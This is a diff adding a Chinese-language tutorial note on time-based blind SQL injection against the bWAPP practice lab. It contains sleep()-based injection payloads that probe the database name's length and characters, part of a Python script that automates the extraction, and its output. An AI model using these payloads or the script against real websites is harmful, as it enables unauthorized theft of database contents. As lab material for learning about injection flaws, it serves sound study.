@@ -1,3 +1,34 @@
+# Time Based sqlinject
+
+针对 网页无回显的  时间盲注。
+
+## 1 POC
+bwapp靶场
+### 1.1 数据库长度
+```sql
+Iron Man' and length(database()) = 1  and sleep(2) -- 
+Iron Man' and length(database()) = 2  and sleep(2) -- 
+```
+![img.png](imgs/time-based-sqli2.png)
+
+响应时间为 毫秒级
+```sql
+Iron Man' and length(database()) > 1  and sleep(2) -- 
+Iron Man' and length(database()) = 5  and sleep(2) -- 
+```
+![img.png](imgs/time-base-sqli.png)
+
+响应时间为 秒级 说明 length() 中间为真，以此判断数据库名 长度。
+
+### 1.2 数据库名字
+```sql
+ascII 33 - 127
+Iron Man' and ascii(substr(database(),{},1))={} and sleep(1) --
+```
+![img.png](imgs/ascii码表.png)
+### 2 编写 python 脚本
+
+```python
 import requests
 import time
 
@@ -41,3 +72,11 @@ def get_database_name(count):
 
 # get_database_name_length()
 get_database_name(get_database_name_length())
+```
+
+### 2.1结果
+```
+长度为5
+bWAPP
+进程已结束,退出代码0
+```
